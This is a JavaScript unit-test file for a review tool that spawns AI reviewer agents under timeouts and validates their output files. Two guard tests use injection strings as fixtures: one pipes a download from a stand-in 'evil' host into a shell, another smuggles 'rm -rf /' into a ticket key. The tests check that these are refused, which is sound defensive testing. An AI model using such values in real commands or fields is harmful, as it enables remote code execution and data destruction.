/**
 * js/unit-tests/test_reviewPoolInJob.js — the gh-1471 IN-JOB round executor
 * (the redesign of the fire-and-forget leg dispatcher).
 *
 * Covers: the deterministic specialist selection (round type, rounds scope,
 * triggerPaths), the prompt contract (identity, lens path, candidates file,
 * head sha, no-posting rule), the bounded run-agent.sh command shape, and
 * both round halves — runSpecialists (execution + per-specialist outcome)
 * and readSpecialistOutcomes (the post action's file-view, same selection).
 * Fail-open semantics: timeout/crash/invalid/stale candidates all degrade
 * to `unavailable` without throwing.
 *
 * Runs under the documented dmtools runner (loadModule/makeRequire + the
 * injected assert — see js/unit-tests/testRunner.js): the candidates/
 * coverage fixtures live in the module's memoryIo map, so no Node builtins
 * (fs/path/os) are touched (the review IMPORTANT: the Node-idiom file reds
 * `dmtools run js/unit-tests/run_reviewPoolExecution.json`).
 */
'use strict';

// loadModule/makeRequire/assert are the harness globals (see testRunner.js);
// the require closure of reviewPoolInJob.js resolves for real through
// REAL_COMMON_MODULES (reviewPoolCandidates/reviewPool/reviewPolicy/
// reviewVerdicts are all pure).

var inJob = loadModule('js/common/reviewPoolInJob.js', makeRequire({}), {});
var candidatesModule = loadModule('js/common/reviewPoolCandidates.js', makeRequire({}), {});


var HEAD = 'aaaabbbbccccddddeeeeffff0000111122223333';
var STALE = '9999888877776666555544443333222211110000';

function skillOf(name, overrides) {
    return Object.assign({
        name: name,
        lens: 'instructions/pr_review/' + name + '/lens.md',
        roleLine: 'Specialized reviewer — ' + name,
        mayRaise: ['BLOCKING', 'SUGGESTION'],
        rounds: ['first', 'hunks'],
        triggerPaths: [],
        isEnabled: true
    }, overrides || {});
}

var poolOf = function(reviewers) {
    return { reviewers: reviewers, policy: {}, warnings: [] };
};

var ctxOf = function(overrides) {
    return Object.assign({
        ticketKey: 'gh-1471',
        headSha: HEAD,
        hasNewHunks: false,
        newHunkPaths: []
    }, overrides || {});
};

/** In-memory io + the executed-command log — the harness port of the
 * former tmpdir io: the candidates/coverage files ride the io map. */
function recorder() {
    var executed = [];
    var io = inJob.memoryIo({}, function() {});
    return { io: io, executed: executed };
}

function candidatesFile(io, reviewer, head, findings) {
    io.writeFile(inJob.candidatesPathOf(reviewer), JSON.stringify({
        reviewer: reviewer, head: head,
        candidates: findings || [],
        count: (findings || []).length, truncated: false,
        at: '2026-11-13T00:00:00Z'
    }));
}

function coverageFile(io, reviewer, head, covered, pending) {
    io.writeFile(inJob.coveragePathOf(reviewer), JSON.stringify({
        reviewer: reviewer, head: head, covered: covered,
        pending: pending, truncated: false, at: '2026-11-13T00:00:00Z'
    }));
}


// ── selection ────────────────────────────────────────────────────────────────

test('selection: enabled reviewers only', function() {
    var pool = poolOf([skillOf('general'), skillOf('off', { isEnabled: false })]);
    var got = inJob.selectSpecialists(pool, ctxOf());
    assert.deepEqual(got.map(function(s) { return s.name; }), ['general']);
});

test('selection: rounds scope excludes the specialist on a first round', function() {
    var pool = poolOf([skillOf('general'), skillOf('hunksOnly', { rounds: ['hunks'] })]);
    var got = inJob.selectSpecialists(pool, ctxOf({ hasNewHunks: false }));
    assert.deepEqual(got.map(function(s) { return s.name; }), ['general']);
    var hunks = inJob.selectSpecialists(pool, ctxOf({ hasNewHunks: true, newHunkPaths: ['js/x.js'] }));
    assert.deepEqual(hunks.map(function(s) { return s.name; }), ['general', 'hunksOnly']);
});

test('selection: triggerPaths gate hunks-only reviewers; first-rounds reviewers run every pass', function() {
    var pool = poolOf([
        skillOf('general'),
        skillOf('scoped', { triggerPaths: ['js/'] }),
        skillOf('docsOnlyHunks', { rounds: ['hunks'], triggerPaths: ['docs/'] }),
        skillOf('jsOnlyHunks', { rounds: ['hunks'], triggerPaths: ['js/'] })
    ]);
    // The canonical §6 doctrine, per-run state (firstDone is always false in
    // a run): triggerPaths gate the HUNKS flag only — a first-rounds reviewer
    // runs on every pass; a hunks-only reviewer runs when its paths hit.
    var first = inJob.selectSpecialists(pool, ctxOf({ hasNewHunks: false, newHunkPaths: [] }));
    assert.deepEqual(first.map(function(s) { return s.name; }),
        ['general', 'scoped'], 'a first pass runs the first-rounds reviewers');
    var hunks = inJob.selectSpecialists(pool, ctxOf({ hasNewHunks: true, newHunkPaths: ['js/dep/file.js'] }));
    assert.deepEqual(hunks.map(function(s) { return s.name; }),
        ['general', 'scoped', 'jsOnlyHunks'], 'the hunks round scopes hunks-only reviewers by triggerPaths');
});

test('the CWE-78 guard: a hostile reviewer name never composes a spawn command', function() {
    var spawned = [];
    var io = inJob.memoryIo({}, function(cmd) { spawned.push(cmd); });
    var pool = poolOf([skillOf('x; curl evil|sh')]);
    var round = inJob.runSpecialists(io, pool, ctxOf({ hasNewHunks: true, newHunkPaths: ['js/x.js'] }));
    assert.deepEqual(round.completed, [], 'nothing completed');
    assert.deepEqual(spawned, [], 'NO command was built');
    assert.equal(round.unavailable[0], 'x; curl evil|sh');
    assert.ok(round.results[0].reason.indexOf('unsafe identifier') === 0,
        'the guard reason names the refusal');
});

test('the CWE-78 guard: a hostile ticket key is refused the same way', function() {
    var spawned = [];
    var io = inJob.memoryIo({}, function(cmd) { spawned.push(cmd); });
    var pool = poolOf([skillOf('security')]);
    var round = inJob.runSpecialists(io, pool, ctxOf({ ticketKey: 'gh-1"; rm -rf /', hasNewHunks: true }));
    assert.deepEqual(spawned, [], 'NO command built for a hostile ticket key');
    assert.deepEqual(round.unavailable, ['security']);
});

test('the batch command: parallel spawn, per-child caps, the outer round-budget cap', function() {
    // The parallel in-job decision: every specialist runs backgrounded under
    // its own gh-75 cap; `wait` settles the batch; the OUTER timeout caps
    // the whole batch at the round budget — the wall clock stops scaling
    // with the reviewer count (the security-lens CWE-400 hardening).
    var cmd = inJob.buildBatchCommand(
        ['input/gh-1/pool_specialist-alpha.md', 'input/gh-1/pool_specialist-beta.md'],
        900, 1800);
    assert.ok((cmd.match(/timeout -k 60 900 bash agents\/scripts\/run-agent.sh/g) || []).length === 2,
        'each specialist carries its own 900s cap');
    assert.ok(cmd.indexOf('timeout -k 60 1800') !== -1, 'the outer cap is the round budget');
    assert.ok(cmd.indexOf('\nwait') !== -1, 'the batch settles on wait');
    assert.ok(cmd.indexOf('&') !== -1, 'the specialists are backgrounded');
    // One specialist degenerates to the same shape (a single backgrounded run).
    var single = inJob.buildBatchCommand(['input/gh-1/pool_specialist-solo.md'], null, null);
    assert.ok(single.indexOf('timeout -k 60 900') !== -1 && single.indexOf('wait') !== -1,
        'the defaults apply (900s cap, the default budget)');
});
test('prompt: the incremental + partial-write discipline (truncated flag)', function() {
    var prompt = inJob.buildSpecialistPrompt(skillOf('security'), ctxOf({ hasNewHunks: true }));
    assert.ok(prompt.indexOf('INCREMENTAL WRITES') !== -1, 'the incremental-write instruction is present');
    assert.ok(prompt.indexOf('"truncated": true') !== -1, 'the partial-coverage flag is taught');
    assert.ok(prompt.indexOf('a partial honest record is a valid result') !== -1,
        'partial beats silence is explicit');
});

test('roundTypeOf: first vs hunks', function() {
    assert.equal(inJob.roundTypeOf(ctxOf({ hasNewHunks: false })), 'first');
    assert.equal(inJob.roundTypeOf(ctxOf({ hasNewHunks: true })), 'hunks');
});

// ── prompt contract ──────────────────────────────────────────────────────────

test('prompt: identity, lens path, head sha, output file, no-posting rule', function() {
    var skill = skillOf('security');
    var prompt = inJob.buildSpecialistPrompt(skill, ctxOf());
    assert.ok(prompt.indexOf('security') !== -1, 'the reviewer name is present');
    assert.ok(prompt.indexOf(skill.lens) !== -1, 'the lens path is present');
    assert.ok(prompt.indexOf(HEAD) !== -1, 'the head sha is present');
    assert.ok(prompt.indexOf(inJob.candidatesPathOf('security')) !== -1, 'the candidates file is present');
    assert.ok(prompt.indexOf('no comments') !== -1, 'the no-posting rule is present');
    assert.ok(prompt.indexOf('"reviewer": "security"') !== -1, 'the strict JSON reviewer field is present');
});

// ── command shape (gh-775 bounded invocation) ────────────────────────────────

test('command: run-agent.sh under timeout -k 60 with a prompt file', function() {
    var command = inJob.buildSpecialistCommand('outputs/pool_specialist-security.md', 900);
    assert.ok(command.indexOf('timeout -k 60 900') !== -1, 'the hard wall-clock cap is present');
    assert.ok(command.indexOf('bash agents/scripts/run-agent.sh') !== -1, 'the wrapper is bash (the agents/-mounted pack path)');
    assert.ok(command.indexOf('outputs/pool_specialist-security.md') !== -1, 'the prompt rides a file');
});

test('command: the default timeout applies on garbage input', function() {
    var command = inJob.buildSpecialistCommand('x.md', 'nope');
    assert.ok(command.indexOf('timeout -k 60 ' + inJob.DEFAULT_SPECIALIST_TIMEOUT_SECONDS) !== -1);
});

// ── runSpecialists: execution + outcome split ────────────────────────────────

var pool = poolOf([skillOf('general'), skillOf('security'), skillOf('flaky')]);
// NOTE: 'base' (the posting reviewer) is excluded from the specialists by
// design — these fixtures use 'general' as a non-posting specialist name.

test('runSpecialists: completed vs unavailable, validated candidates only (batch)', function() {
    var t = recorder();
    var spawnedPrompts = [];
    t.io.executeCommand = function(command) {
        t.executed.push(command);
        // The composite spawns every prompt; only security lands a valid file.
        (command.match(/pool_specialist-[a-z]+\.md/g) || []).forEach(function(p) { spawnedPrompts.push(p); });
        candidatesFile(t.io, 'security', HEAD, []);
    };
    var round = inJob.runSpecialists(t.io, pool, ctxOf());
    assert.equal(t.executed.length, 1, 'ONE composite command per round');
    assert.equal(spawnedPrompts.length, 3, 'every specialist spawns (parallel)');
    assert.deepEqual(round.completed, ['security']);
    assert.deepEqual(round.unavailable, ['general', 'flaky']);
    assert.equal(round.candidates.length, 1);
    assert.equal(round.candidates[0].reviewer, 'security');
    assert.equal(round.candidates[0].count, 0);
});
test('runSpecialists: stale candidates (wrong head) are unavailable', function() {
    var t = recorder();
    t.io.executeCommand = function(command) {
        t.executed.push(command);
        candidatesFile(t.io, 'security', STALE, []);
    };
    var round = inJob.runSpecialists(t.io, pool, ctxOf());
    assert.deepEqual(round.completed, []);
    assert.ok(round.unavailable.indexOf('security') !== -1, 'security is unavailable');
});
test('runSpecialists: an invalid record degrades to unavailable (no throw)', function() {
    var t = recorder();
    t.io.executeCommand = function(command) {
        t.executed.push(command);
        t.io.writeFile(inJob.candidatesPathOf('security'), '{"nope": true}');
    };
    var round = inJob.runSpecialists(t.io, pool, ctxOf());
    assert.deepEqual(round.completed, []);
    var sec = round.results.filter(function(r) { return r.reviewer === 'security'; })[0];
    assert.ok(sec && sec.reason && sec.reason.indexOf('invalid candidates record') !== -1);
});

test('runSpecialists: the composite throwing degrades EVERYTHING (fail-open, no throw)', function() {
    var t = recorder();
    t.io.executeCommand = function(command) {
        t.executed.push(command);
        throw new Error('timeout -k 60 1800 …');
    };
    var round = inJob.runSpecialists(t.io, pool, ctxOf());
    assert.deepEqual(round.completed, []);
    assert.equal(round.unavailable.length, 3);
    assert.ok(round.results.every(function(r) { return !r.ok; }), 'every result is unavailable');
});

test('runSpecialists: a killed specialist with coverage memory notes the continuation', function() {
    var t = recorder();
    t.io.executeCommand = function(command) {
        t.executed.push(command);
        // The child died mid-pass but its coverage file landed (the
        // incremental-write discipline).
        coverageFile(t.io, 'security', HEAD, ['js/x.js'], ['js/y.js']);
    };
    var round = inJob.runSpecialists(t.io, pool, ctxOf());
    assert.deepEqual(round.completed, []);
    assert.equal(round.coverageNotes.length, 1, 'the continuation note exists');
    assert.equal(round.coverageNotes[0].reviewer, 'security');
    assert.ok(round.coverageNotes[0].text.indexOf('covered 1, pending 1') !== -1,
        'the note carries the counts');
});

test('prompt: the diff file follows the round (hunks on re-reviews, the full PR diff on first rounds)', function() {
    // The review BLOCKING: the prompt rendered pr_new_hunks.txt unconditionally,
    // but that file is materialized only on re-reviews — a first round never
    // writes it. The machine now names the file per round.
    var reReview = inJob.buildSpecialistPrompt(skillOf('security'), ctxOf({ hasNewHunks: true, newHunkPaths: ['js/x.js'] }));
    assert.ok(reReview.indexOf('pr_new_hunks.txt') !== -1, 'the re-review prompt points at the hunks file');
    var first = inJob.buildSpecialistPrompt(skillOf('security'), ctxOf({ hasNewHunks: false }));
    assert.ok(first.indexOf('pr_diff.txt') !== -1, 'the first-round prompt points at the standard full PR diff');
    assert.ok(first.indexOf('pr_new_hunks.txt') === -1, 'the first-round prompt never names the absent hunks file');
});

test('the round budget default is 1800s — it MUST exceed the per-specialist 900s cap', function() {
    // The review IMPORTANT: the shipped 180 default (3 minutes) killed the
    // batch before any 900s specialist could finish — the pool no-op'd every
    // round. The units bug is pinned by this test.
    assert.equal(inJob.DEFAULT_ROUND_BUDGET_SECONDS, 1800,
        '30 minutes, strictly greater than the per-specialist 900s cap');
    var cmd = inJob.buildBatchCommand(['input/t/pool_specialist-security.md'], null, null);
    assert.ok(cmd.indexOf('timeout -k 60 1800') !== -1, 'the defaults apply to the command');
});

test('readSpecialistOutcomes: no continuation note for a specialist that delivered candidates', function() {
    // The review IMPORTANT: the coverage note fired for COMPLETED specialists
    // (a lying "no candidates" note while the candidates were accepted).
    var io = inJob.memoryIo({});
    candidatesFile(io, 'security', HEAD, [{ severity: 'SUGGESTION', path: 'js/y.js', line: 2, body: 'b', claim: 'c' }]);
    coverageFile(io, 'security', HEAD, ['js/x.js'], []);
    var pool = poolOf([skillOf('security')]);
    var out = inJob.readSpecialistOutcomes(io, pool, ctxOf({ hasNewHunks: true, newHunkPaths: ['js/x.js'] }));
    assert.deepEqual(out.completed, ['security']);
    assert.deepEqual(out.coverageNotes, [], 'a completed specialist gets NO continuation note');
});

test('prompt: the coverage file contract (plan-first) + the previous-pass memory', function() {
    var prompt = inJob.buildSpecialistPrompt(skillOf('security'), ctxOf({ hasNewHunks: true }));
    assert.ok(prompt.indexOf('coverage-security.json') !== -1, 'the coverage file path is present');
    assert.ok(prompt.indexOf('write it FIRST') !== -1, 'the plan-first discipline is explicit');
    assert.ok(prompt.indexOf('"pending"') !== -1, 'the pending list is in the contract');
    var withPrev = inJob.buildSpecialistPrompt(skillOf('security'),
        ctxOf({ hasNewHunks: true }),
        { reviewer: 'security', head: 'aaa1111', covered: ['js/x.js'], pending: ['js/y.js'], truncated: true });
    assert.ok(withPrev.indexOf('Your previous pass (head aaa1111)') !== -1, 'the previous head is named');
    assert.ok(withPrev.indexOf('SKIP the covered files that are NOT in the current hunks') !== -1,
        'the machine-verified skip rule is explicit');
    assert.ok(withPrev.indexOf('start with the pending ones') !== -1, 'the debt-first ordering is taught');
});
// ── readSpecialistOutcomes: the post action's file-view ─────────────────────

test('readSpecialistOutcomes: same selection, file-driven outcomes', function() {
    var t = recorder();
    candidatesFile(t.io, 'security', HEAD, [{ severity: 'SUGGESTION', path: 'js/y.js', line: 2, body: 'b', claim: 'c' }]);
    var out = inJob.readSpecialistOutcomes(t.io, pool, ctxOf());
    assert.deepEqual(out.completed, ['security']);
    assert.deepEqual(out.unavailable, ['general', 'flaky']);
    assert.equal(out.candidates[0].candidates[0].path, 'js/y.js');
    // The record validates through the gh-1406 contract unchanged:
    assert.ok(candidatesModule.candidatesRecordFromPayload(out.candidates[0]));
});

test('readSpecialistOutcomes: every specialist unavailable on an empty workspace', function() {
    var out = inJob.readSpecialistOutcomes(inJob.memoryIo({}), pool, ctxOf());
    assert.deepEqual(out.completed, []);
    assert.equal(out.unavailable.length, 3);
});


suite('readCoverage — the coverage-file shape contract (reject paths are NO memory)', function() {
    function ioWith(payload) {
        var files = {};
        files[inJob.coveragePathOf('security')] = payload;
        return inJob.memoryIo(files);
    }

    test('a well-formed coverage file round-trips (head/covered/pending/truncated)', function() {
        var cov = inJob.readCoverage(ioWith(JSON.stringify({
            reviewer: 'security', head: 'abc', covered: ['a.js'], pending: ['b.js', 42], truncated: true, at: 't'
        })), 'security');
        assert.equal(cov.head, 'abc');
        assert.deepEqual(cov.covered, ['a.js']);
        assert.deepEqual(cov.pending, ['b.js', '42'], 'entries normalize to strings');
        assert.equal(cov.truncated, true);
    });

    test('garbage JSON is no memory (fail-open, never a throw)', function() {
        assert.equal(inJob.readCoverage(ioWith('{nope'), 'security'), null);
    });

    test('another reviewer\'s file is no memory', function() {
        var io = ioWith(JSON.stringify({
            reviewer: 'legal', head: 'abc', covered: ['a.js'], pending: []
        }));
        assert.equal(inJob.readCoverage(io, 'security'), null);
    });

    test('missing covered/pending arrays are no memory', function() {
        assert.equal(inJob.readCoverage(ioWith(JSON.stringify({ reviewer: 'security', head: 'abc' })), 'security'), null);
        var io2 = ioWith(JSON.stringify({
            reviewer: 'security', head: 'abc', covered: 'a.js'
        }));
        assert.equal(inJob.readCoverage(io2, 'security'), null);
    });

    test('a non-object payload is no memory; an absent file is no memory; a throwing reader is no memory', function() {
        assert.equal(inJob.readCoverage(ioWith('"[]"'), 'security'), null);
        assert.equal(inJob.readCoverage(ioWith(''), 'security'), null);
        assert.equal(inJob.readCoverage({ readFile: function() { throw new Error('boom'); } }, 'security'), null);
    });
});

suite('coverageSection / buildSpecialistPrompt — the rendered contract', function() {
    test('a first pass renders the plan-first coverage file contract without the previous-pass block', function() {
        var section = inJob.coverageSection({ headSha: 'abc' }, null);
        assert.ok(section.indexOf('Coverage file') !== -1);
        assert.ok(section.indexOf('abc') !== -1);
        assert.equal(section.indexOf('previous pass'), -1);
    });

    test('a previous pass with work renders the SKIP/REVIEW rules (the hunks file is the delta)', function() {
        var section = inJob.coverageSection({ headSha: 'abc' }, {
            head: 'old', covered: ['a.js'], pending: ['b.js']
        });
        assert.ok(section.indexOf('previous pass') !== -1);
        assert.ok(section.indexOf('SKIP the covered files') !== -1);
        assert.ok(section.indexOf('`a.js`') !== -1);
        assert.ok(section.indexOf('oldest debt') !== -1);
    });

    test('a blank previous pass (no work) stays first-pass shaped', function() {
        var section = inJob.coverageSection({ headSha: 'abc' }, { head: 'old', covered: [], pending: [] });
        assert.equal(section.indexOf('previous pass'), -1);
    });

    test('the specialist prompt names the reference pack only when the skill carries one', function() {
        var skill = { name: 'security', lens: 'l.md', options: { referencePack: 'pack/x' } };
        var withPack = inJob.buildSpecialistPrompt(skill, { headSha: 'abc' }, null);
        assert.ok(withPack.indexOf('Reference pack: `agents/pack/x`') !== -1);
        var noPack = inJob.buildSpecialistPrompt({ name: 'security', lens: 'l.md' }, { headSha: 'abc' }, null);
        assert.equal(noPack.indexOf('Reference pack'), -1);
    });

    test('the prompt scope line flips on the hunks flag', function() {
        var first = inJob.buildSpecialistPrompt({ name: 'security', lens: 'l.md' }, { headSha: 'abc' }, null);
        assert.ok(first.indexOf('first full review') !== -1);
        var hunks = inJob.buildSpecialistPrompt({ name: 'security', lens: 'l.md' },
            { headSha: 'abc', hasNewHunks: true, newHunkPaths: ['a.js'] }, null);
        assert.ok(hunks.indexOf('re-review with new hunks') !== -1);
    });
});
